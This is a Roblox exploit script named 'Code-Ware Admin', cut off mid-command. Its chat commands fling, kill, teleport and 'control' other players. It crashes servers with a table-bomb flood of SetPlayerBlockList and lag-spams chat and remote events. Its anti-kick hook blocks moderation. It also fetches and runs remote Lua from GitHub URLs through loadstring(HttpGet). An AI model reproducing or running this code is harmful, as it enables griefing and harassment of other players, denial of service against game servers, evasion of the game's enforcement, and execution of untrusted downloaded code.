local Source = game:HttpGet("https://raw.githubusercontent.com/KadeTheExploiter/IncognitoScripts/main/ScriptSupport.lua")
loadstring(Source)()
local players = game:GetService("Players")
local plr = players.LocalPlayer
 
local function getChar()
    return plr.Character
end
 
local function getBp()
    return plr.Backpack
end
 
local function getPlr(str)
    for i,v in pairs(players:GetPlayers()) do
        if v.Name:lower():match(str) or v.DisplayName:lower():match(str) then
            return v
        end
    end
end
 
local netless_Y = Vector3.new(0, 26, 0)
local v3_101 = Vector3.new(1, 0, 1)
local inf = math.huge
local v3_0 = Vector3.new(0,0,0)
local function getNetlessVelocity(realPartVelocity) --edit this if you have a better netless method
    if (realPartVelocity.Y > 1) or (realPartVelocity.Y < -1) then
        return realPartVelocity * (25.1 / realPartVelocity.Y)
    end
    realPartVelocity = realPartVelocity * v3_101
    local mag = realPartVelocity.Magnitude
    if mag > 1 then
        realPartVelocity = realPartVelocity * 100 / mag
    end
    return realPartVelocity + netless_Y
end
 
local function align(Part0, Part1, p, r)
    Part0.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0.0001, 0.0001, 0.0001, 0.0001)
    Part0.CFrame = Part1.CFrame
    local att0 = Instance.new("Weld", Part0)
    att0.Name = "att0_" .. Part0.Name
    local att1 = Instance.new("Weld", Part1)
    att1.Name = "att1_" .. Part1.Name
 
    local apd = Instance.new("AlignPosition", att0)
    apd.ApplyAtCenterOfMass = false
    apd.MaxForce = inf
    apd.MaxVelocity = inf
    apd.ReactionForceEnabled = false
    apd.Responsiveness = 200
    apd.Part1 = att1
    apd.Part0 = att0
    apd.Name = "AlignPositionRfalse"
    apd.RigidityEnabled = false
 
    local ao = Instance.new("AlignOrientation", att0)
    ao.MaxAngularVelocity = inf
    ao.MaxTorque = inf
    ao.PrimaryAxisOnly = false
    ao.ReactionTorqueEnabled = false
    ao.Responsiveness = 200
    ao.Attachment1 = att1
    ao.Attachment0 = att0
    ao.RigidityEnabled = false
    
    if type(getNetlessVelocity) == "function" then
        local realVelocity = Vector3.new(0,30,0)
        local steppedcon = game:GetService("RunService").Stepped:Connect(function()
            Part0.Velocity = realVelocity
        end)
        local heartbeatcon = game:GetService("RunService").Heartbeat:Connect(function()
            realVelocity = Part0.Velocity
            Part0.Velocity = getNetlessVelocity(realVelocity)
        end)
        Part0.Destroying:Connect(function()
            Part0 = nil
            steppedcon:Disconnect()
            heartbeatcon:Disconnect()
        end)
    end
    
    att0.Orientation = r or v3_0
    att0.Position = v3_0
    att1.Orientation = v3_0 
    att1.Position = p or v3_0
    Part0.CFrame = Part1.CFrame
end
 
local function attachTool(tool,cf)
    for i,v in pairs(tool:GetDescendants()) do
        if not (v:IsA("BasePart") or v:IsA("Mesh") or v:IsA("SpecialMesh")) then
            v:Destroy()
        end
    end
    local rgrip1 = Instance.new("Weld")
    rgrip1.Name = "RightGrip"
    rgrip1.Part0 = getChar()["Right Arm"]
    rgrip1.Part1 = tool.Handle
    rgrip1.C0 = cf
    rgrip1.C1 = tool.Grip
    rgrip1.Parent = getChar()["Right Arm"]
    tool.Parent = getBp()
    tool.Parent = getChar().Humanoid
    tool.Parent = getChar()
    tool.Handle:BreakJoints()
    tool.Parent = getBp()
    tool.Parent = getChar().Humanoid
    local rgrip2 = Instance.new("Weld")
    rgrip2.Name = "RightGrip"
    rgrip2.Part0 = getChar()["Right Arm"]
    rgrip2.Part1 = tool.Handle
    rgrip2.C0 = cf
    rgrip2.C1 = tool.Grip
    rgrip2.Parent = getChar()["Right Arm"]
    return rgrip2
end
 
local nc = false
local ncLoop
ncLoop = game:GetService("RunService").Stepped:Connect(function()
    if nc and getChar() ~= nil then
        for _, v in pairs(getChar():GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide == true then
                v.CanCollide = false
            end
        end
    end
end)
 
local netsleepTargets = {}
local nsLoop
nsLoop = game:GetService("RunService").Stepped:Connect(function()
    if #netsleepTargets == 0 then return end
    for i,v in pairs(netsleepTargets) do
        if v.Character then
            for i,v in pairs(v.Character:GetChildren()) do
                if v:IsA("BasePart") == false and v:IsA("Accessory") == false then continue = true end
                if v:IsA("BasePart") then
                    sethiddenproperty(v,"NetworkIsSleeping",true)
                elseif v:IsA("Accessory") and v:FindFirstChild("Handle") then
                    sethiddenproperty(v.Handle,"NetworkIsSleeping",true)
                end
            end
        end
    end
end)
 
local cc;cc = plr.Chatted:Connect(function(msg)
    local spaceSplit = msg:split(" ")
    if spaceSplit[1] == ".bring" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        local mypos = getChar().HumanoidRootPart.CFrame
        if target == nil or tool == nil then return end
        local attWeld = attachTool(tool,CFrame.new(0,0,0))
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        tool.AncestryChanged:Wait()
        getChar().HumanoidRootPart.CFrame = mypos
        wait(.25)
        attWeld:Destroy()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Brung "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".control" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        if target == nil or tool == nil then return end
        getChar().Animate.Disabled = true
        for i,v in pairs(getChar().Humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
        end
        getChar().HumanoidRootPart.CFrame = target.Character.Humanoid.RootPart.CFrame
        getChar().Humanoid.HipHeight = 100
        tool.Handle.CanCollide = false
        local attWeld = attachTool(tool,CFrame.new(-1.5, -(100 - (tool.Handle.Size.Y/2)), 0))
        workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Controlling "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".view" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        if target == nil then return end
        workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Viewing "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".unview" then
        workspace.CurrentCamera.CameraSubject = getChar().Humanoid
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Deactivated Viewing",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".antikick" then
        --// Variables
 
local Players = game:GetService("Players")
local OldNameCall = nil
 
--// Global Variables
 
getgenv().SendNotifications = true -- Set to true if you want to get notified regularly.
 
--// Anti Kick Hook
 
OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
    local NameCallMethod = getnamecallmethod()
 
    if tostring(string.lower(NameCallMethod)) == "kick" then
        if getgenv().SendNotifications == true then
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Code-Ware Anti-Kick",
                Text = "Kicked Detected, Prevented Kick",
                Icon = "rbxassetid://6238540373",
                Duration = 3,
            })
        end
        
        return nil
    end
    
    return OldNameCall(Self, ...)
end)
 
if getgenv().SendNotifications == true then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Code-Ware Anti-Kick",
        Text = "Anti-Kick Active",
        Icon = "rbxassetid://6238537240",
        Duration = 5,
    })
end
    elseif spaceSplit[1] == ".update" then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Updating Script",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
        cc:Disconnect()
        nsLoop:Disconnect()
        ncLoop:Disconnect()
        wait(1)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TypicalOperator/Code-Ware-FE/main/Admin.lua"))()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Updated Script",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".chatlag" then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Chat Lag Active",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
        local AmountOfMessages = 3
        local SafeMode = false
        local SafemodeWaitTime = 4
 
        while SafeMode == false do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("　", "All")
            wait()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("　", "All")
            wait()
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("　", "All")
        end
    elseif spaceSplit[1] == ".serverlag" then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Server Lag Active",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
        while wait(0.6) do 
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
            local function getmaxvalue(val)
               local mainvalueifonetable = 499999
               if type(val) ~= "number" then
                   return nil
               end
               local calculateperfectval = (mainvalueifonetable/(val+2))
               return calculateperfectval
            end
            
            local function bomb(tableincrease, tries)
            local maintable = {}
            local spammedtable = {}
            
            table.insert(spammedtable, {})
            z = spammedtable[1]
            
            for i = 1, tableincrease do
                local tableins = {}
                table.insert(z, tableins)
                z = tableins
            end
            
            local calculatemax = getmaxvalue(tableincrease)
            local maximum
            
            if calculatemax then
                 maximum = calculatemax
                 else
                 maximum = 999999
            end
            
            for i = 1, maximum do
                 table.insert(maintable, spammedtable)
            end
            
            for i = 1, tries do
                 game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
            end
            end
            
            bomb(250, 2) --// change values if client crashes
            end
    elseif spaceSplit[1] == ".remotespam" then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Remote Spam Active",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
        local Remote = game.ReplicatedStorage:FindFirstChildOfClass("RemoteEvent")
        while true do
            wait()
            Remote:FireServer()
        end
    elseif spaceSplit[1] == ".uncontrol" then
        if getChar()["Right Arm"]:FindFirstChild("RightGrip") then
            getChar()["Right Arm"]:FindFirstChild("RightGrip"):Destroy()
            getChar().Humanoid.HipHeight = 0
            workspace.CurrentCamera.CameraSubject = getChar().Humanoid
            getChar().Animate.Disabled = false
            getChar().HumanoidRootPart.CFrame = getChar().HumanoidRootPart.CFrame * CFrame.new(0,-90,0)
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Deactivated Controlling",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".hold" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        if target == nil or tool == nil then return end
        for i,v in pairs(getChar().Humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
        end
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        local anim = Instance.new("Animation")
        anim.AnimationId = "rbxassetid://182393478"
        local k = getChar().Humanoid:LoadAnimation(anim)
        k:Play(0)
        k:AdjustSpeed(0)
        tool.Handle.CanCollide = false
        attachTool(tool,CFrame.new(-1,-2,0) * CFrame.Angles(math.rad(-90),0,0))
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Holding "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".carry" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        if target == nil or tool == nil then return end
        tool.Handle.CanCollide = false
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        attachTool(tool,CFrame.new(1.5,-3,1) * CFrame.Angles(math.rad(-90),0,0))
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Carrying "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".void" or spaceSplit[1] == ".kill" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        if target == nil or tool == nil then return end
        local old = getChar().HumanoidRootPart.CFrame
        local olddh = workspace.FallenPartsDestroyHeight
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        workspace.FallenPartsDestroyHeight = 0/0
        tool.Handle.CanCollide = false
        local attWeld = attachTool(tool,CFrame.new(-1,-2,0) * CFrame.Angles(math.rad(-90),0,0))
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        tool.AncestryChanged:Wait()
        getChar().HumanoidRootPart.CFrame = getChar().HumanoidRootPart.CFrame * CFrame.new(0,math.huge,0)
        wait(.5)
        attWeld:Destroy()
        wait(.5)
        getChar().HumanoidRootPart.CFrame = old
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Killed "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".nolimbs" or spaceSplit[1] == ".removelimbs" then
        getChar()["Right Arm"]:Destroy()
        getChar()["Left Arm"]:Destroy()
        getChar()["Right Leg"]:Destroy()
        getChar()["Left Leg"]:Destroy()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Removed Limbs",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".bang" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        if target == nil or tool == nil then return end
        for i,v in pairs(getChar().Humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
        end
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        local anim = Instance.new("Animation")
        anim.AnimationId = "rbxassetid://148840371"
        local k = getChar().Humanoid:LoadAnimation(anim)
        k.Looped = true
        k:Play(0)
        k:AdjustSpeed(10)
        tool.Handle.CanCollide = false
        local attWeld= attachTool(tool,CFrame.new(0.2,4,2) * CFrame.Angles(math.rad(90),0,0))
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Code-Ware Admin",
    Text = "Banging "..target.Name,
    Icon = "rbxassetid://6238537240",
    Duration = 3,
})
    elseif spaceSplit[1] == ".walkspeed" or spaceSplit[1] == ".ws" then
        local val = tonumber(spaceSplit[2])
        if val == nil then return end 
        getChar().Humanoid.WalkSpeed = val
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Set Walkspeed To "..val,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".jumppower" or spaceSplit[1] == ".jp" then
        local val = tonumber(spaceSplit[2])
        if val == nil then return end 
        getChar().Humanoid.JumpPower = val
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Set JumpPower To "..val,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".hipheight" or spaceSplit[1] == ".hh" then
        local val = tonumber(spaceSplit[2])
        if val == nil then return end 
        getChar().Humanoid.HipHeight = val
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Set HipHeight To "..val,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".noclip" or spaceSplit[1] == ".nc" then
        nc = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Noclip Activated",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".clip" or spaceSplit[1] == ".c" then
        nc = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Noclip Deactivated",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".goto" or spaceSplit[1] == ".to" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        if target == nil then return end
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Teleported To "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".respawn" or spaceSplit[1] == ".re" then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Respawning",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
        local c = getChar()
        plr.Character = nil
        plr.Character = c
        wait(players.RespawnTime - .1)
        local old = c.HumanoidRootPart.CFrame
        c.Humanoid.Health = 0
        plr.CharacterAdded:Wait()
        getChar():WaitForChild("HumanoidRootPart").CFrame = old
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Respawned",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".equiptools" then
        for i,v in pairs(getBp():GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = getChar()
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Equiped All Tools",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".fling" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        if target == nil then return end
        
        local flingTime = 2.5
        local fTime = os.clock()
        local rot = 0
        local tools = {}
        local originalGrips = {}
        local hum = getChar():FindFirstChildOfClass("Humanoid")
        local root = hum.RootPart
        local tChr = target.Character
        local tHum = tChr:FindFirstChildOfClass("Humanoid")
        local tRoot = tChr:FindFirstChild("Torso") or tChr:FindFirstChild("UpperTorso")
        local origCF = root.CFrame
        local origState = hum:GetState()
        local origFpdh = workspace.FallenPartsDestroyHeight
        workspace.FallenPartsDestroyHeight = 0 / 0
        hum:ChangeState(Enum.HumanoidStateType.Physics)
        hum:UnequipTools()
        for _, v in ipairs(plr.Backpack:GetChildren()) do
            if v:IsA("Tool") and v:FindFirstChild("Handle") then
                table.insert(tools, v)
                table.insert(originalGrips, v.Grip)
                v.Handle.Massless = true
                v.Grip = CFrame.new(5773, 5774, 5773)
                v.Parent = getChar()
            end
        end
        local bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = Vector3.new(9e30, 9e30, 9e30)
        bv.Parent = root
        local bav = Instance.new("BodyAngularVelocity")
        bav.AngularVelocity = Vector3.new(9e30, 9e30, 9e30)
        bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        bav.Parent = root
        while true do
            if os.clock() - fTime >= flingTime then
                break
            else
                if rot == 90 then
                    rot = 0
                else
                    rot = 90
                end
                root.CFrame = tRoot.CFrame * CFrame.Angles(math.rad(rot), 0, 0) + tHum.MoveDirection * tHum.WalkSpeed * .4
            end
            task.wait()
        end
        hum:ChangeState(origState)
        bav:Destroy()
        bv:Destroy()
        root.Velocity = Vector3.new()
        root.RotVelocity = Vector3.new()
        root.CFrame = origCF
        workspace.FallenPartsDestroyHeight = origFpdh
        for i, v in ipairs(tools) do
            if originalGrips[i] then
                v.Grip = originalGrips[i]
            end
        end
        hum:UnequipTools()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = target.Name.." Has Been Flung",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".fling2" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        if target == nil or tool == nil then return end
        for i,v in pairs(getChar().Humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
        end
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        tool.Handle.CanCollide = false
        attachTool(tool,CFrame.new(0,0,0) * CFrame.Angles(math.rad(-90),0,0))
        target.Character.Humanoid.PlatformStand = true
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        tool.AncestryChanged:Wait()
        local power = 999999999
        local bambam = Instance.new("BodyThrust")
        bambam.Parent = getChar().HumanoidRootPart
        bambam.Force = Vector3.new(power,0,power)
        bambam.Location = getChar().HumanoidRootPart.Position
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Second Flung "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".iq" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local realiq = math.random(0, 500)
        if target == nil then return end
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(target.Name.."'s IQ Is "..realiq,"All")
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = target.Name.."'s IQ Is "..realiq,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".toolflingall" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Tool%20Loop%20Fling%20All"))()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Looping Tool Fling All",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".loopflingall" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/loop%20fling%20all"))()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Loop Fling All Active",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".netlag" or spaceSplit[1] == "/netsleep" then
        if spaceSplit[2] and (spaceSplit[2] == "all" or spaceSplit[2] == "others") then
            for i,v in pairs(players:Getplayers()) do
                if v ~= plr then
                    table.insert(netsleepTargets,v)
                end
            end
            return
        end
        local target = getPlr(tostring(spaceSplit[2]):lower())
        if target == nil then return end
        table.insert(netsleepTargets,target)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Started Netlagging "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".unnetlag" or spaceSplit[1] == ".unnetsleep"  then
        if spaceSplit[2] and (spaceSplit[2] == "all" or spaceSplit[2] == "others") then
            netsleepTargets = {}
            return
        end
        local target = getPlr(tostring(spaceSplit[2]):lower())
        if target == nil or table.find(netsleepTargets,target) == nil then return end
        table.remove(netsleepTargets,table.find(netsleepTargets,target))
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Deactivated Netlagging "..target.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".tp" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local target2 = getPlr(tostring(spaceSplit[3]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
        local mypos = getChar().HumanoidRootPart.CFrame
        if target == nil or tool == nil then return end
        getChar().HumanoidRootPart.CFrame = target2.Character.HumanoidRootPart.CFrame
        local attWeld = attachTool(tool,CFrame.new(0,0,0))
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        firetouchinterest(target.Character.Humanoid.RootPart,tool.Handle,0)
        getChar().HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        tool.AncestryChanged:Wait()
        getChar().HumanoidRootPart.CFrame = target2.Character.HumanoidRootPart.CFrame
        wait(0.3)
        getChar().HumanoidRootPart.CFrame = mypos
        tool.AncestryChanged:Wait()
        wait(.25)
        attWeld:Destroy()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Teleported "..target.Name.." To "..target2.Name,
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".clicktp" then
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Click Teleport"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Code-Ware Admin",
    Text = "Gave Click TP Tool",
    Icon = "rbxassetid://6238537240",
    Duration = 3,
})
    elseif spaceSplit[1] == ".mousetool" then 
        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
        local mouse = plr:GetMouse()
        if tool == nil then return end
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Made "..tool.Name.." Follow Your Mouse",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
        tool.Parent = getChar()
        while true do
        wait()
        tool.Handle.Position = mouse.Hit.p
        end
    elseif spaceSplit[1] == ".autograbtools" then
        _G.GrabToolsV1 = true
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Character = Player.Character
local RootPart = Character.HumanoidRootPart
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Code-Ware Admin",
    Text = "Auto Grab Tools Active",
    Icon = "rbxassetid://6238537240",
    Duration = 3,
})
while _G.GrabToolsV1 == true do
    wait()
    for i,v in pairs(game.Workspace:GetChildren()) do
        if v:IsA("Tool") then
             local oldpos = RootPart.CFrame
             RootPart.CFrame = v.Handle.CFrame
             v.AncestryChanged:Wait()
             RootPart.CFrame = oldpos
        end
    end
end
    elseif spaceSplit[1] == ".stopgrabtools" then
        _G.GrabToolsV1 = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Auto Grab Tools Deactivated",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".clone" then
        _G.CloneIllusion = true
local Plr = game:GetService("Players").LocalPlayer
local Char = Plr.Character
while _G.CloneIllusion == true do
    wait()
    local OldPos = Char["HumanoidRootPart"].CFrame
    Char["HumanoidRootPart"].CFrame = OldPos + Vector3.new(0,0,5)
    wait()
    Char["HumanoidRootPart"].CFrame = OldPos
end
    elseif spaceSplit[1] == ".unclone" then
        _G.CloneIllusion = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Clone Illusion Disabled",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".orbit" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        if target == nil then return end
        local player = target.Character.HumanoidRootPart --- enter players name there (do it)
local lpr = game.Players.LocalPlayer.Character.HumanoidRootPart
local speed = 8
local radius = 8 --- orbit size
local eclipse = 1 --- width of orbit
local rotation = CFrame.Angles(0,0,0) --only works for unanchored parts (not localplayer)
local sin, cos = math.sin, math.cos
local rotspeed = math.pi*2/speed
eclipse = eclipse * radius
local runservice = game:GetService('RunService')
local rot = 0
game:GetService('RunService').Stepped:connect(function(t, dt)
rot = rot + dt * rotspeed
lpr.CFrame = rotation * CFrame.new(sin(rot)*eclipse, 0, cos(rot)*radius) + player.Position
end)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Code-Ware Admin",
    Text = "Orbitting "..target.Name,
    Icon = "rbxassetid://6238537240",
    Duration = 3,
})
    elseif spaceSplit[1] == ".freeze" then
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Freeze Enabled",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".unfreeze" then
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Code-Ware Admin",
            Text = "Freeze Disabled",
            Icon = "rbxassetid://6238537240",
            Duration = 3,
        })
    elseif spaceSplit[1] == ".kidnap" then
        local target = getPlr(tostring(spaceSplit[2]):lower())
        local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
